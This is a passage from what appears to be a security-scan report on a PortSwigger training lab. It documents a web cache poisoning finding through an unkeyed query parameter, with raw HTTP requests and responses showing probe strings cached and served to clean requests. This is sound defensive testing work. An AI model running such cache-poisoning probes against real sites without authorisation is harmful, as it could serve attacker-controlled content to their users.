                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-5"></a>

### 5. [MEDIUM] [burp✓] Web cache poisoning (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Unkeyed query string: control GET / returned clean canonical //host/ (12050B), but after GET /?to=UMBRAPOISON9271 won a cache-miss and was stored, three clean GET / requests with no query param were all served the poisoned canonical //host/?to=UMBRAPOISON9271 (12069B) — attacker input reaching requests that never sent it.

The application uses a cache that does not include every query parameter in the cache key. This means the cache can be manipulated into saving responses that have been influenced by these parameters.<br><br>Burp set the following parameter in the request:<br><br>to=j5esihboxi<br><br>This resulted in a response containing j5esihboxi. Burp then resent the request with a different parameter value and got the same response, indicating that it had been cached. (confidence: FIRM) [+1 more URL(s): https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post] @ https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr82ppow-6x` — `artifacts/_/ev-mr82ppow-6x/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net

GET /?to=j5esihboxi&6o3up42o5t=1 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 6o3up42o5t
Accept: */*, text/6o3up42o5t
Origin: https://6o3up42o5t.0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Connection: close
Content-Length: 12077

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=j5esihboxi&6o3up42o5t=1'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The
```

- Evidence `ev-mr82rskv-6z` — `artifacts/_/ev-mr82rskv-6z/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 32
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3602
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr82yudg-77` — `artifacts/_/ev-mr82yudg-77/`

Request:

```http
GET /?to=UMBRAPOISON9271 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
connection: close
content-encoding: gzip
content-length: 3620
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=UMBRAPOISON9271'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
